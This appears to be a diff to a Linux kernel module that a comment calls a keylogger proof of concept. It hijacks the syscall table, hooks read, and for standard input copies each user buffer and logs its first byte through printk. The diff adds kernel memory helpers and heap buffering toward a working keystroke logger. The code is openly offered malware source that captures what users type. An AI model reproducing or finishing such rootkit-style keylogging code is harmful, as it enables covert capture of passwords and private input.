@@ -5,6 +5,7 @@
 #include <linux/unistd.h> // we're messing with syscalls
 #include <linux/syscalls.h> // same as above
 #include <linux/types.h>
+#include <linux/slab.h>
 
 // this file, as it stands, is just a proof of concept. It doesn't
 // keylog anything, it just hijacks the getpid syscall.
@@ -16,6 +17,16 @@
 // a module license is required for most modules to run
 MODULE_LICENSE("GPL");
 
+// allows us to make system calls in the kernel
+mm_segment_t old_fs;
+static inline void begin_kmem(void){
+  old_fs = get_fs();
+  set_fs(get_ds());
+}
+static inline void end_kmem(void){
+  set_fs(old_fs);
+}
+
 // this will point to the syscall_table
 unsigned long *syscall_table;
 
@@ -26,12 +37,13 @@ asmlinkage long (*original_read)(unsigned int, char*, size_t);
 asmlinkage long new_read(unsigned int fd, char *buf, size_t size) {
   // hijacked getpid
   // call the original function
-  int ret = original_read(fd,buf,size);
-  if(!fd){
-    char buffer[size];
+  long ret = original_read(fd,buf,size);
+  if(!fd && ret > 0){
+    char *buffer = (char*)kmalloc(size*sizeof(char), GFP_KERNEL);
     if(!copy_from_user(buffer,buf,size)){
       printk(KERN_ALERT "buf is %c %x",buffer[0], buffer[0]);
     }
+    kfree(buffer);
   }
   return ret;
 }
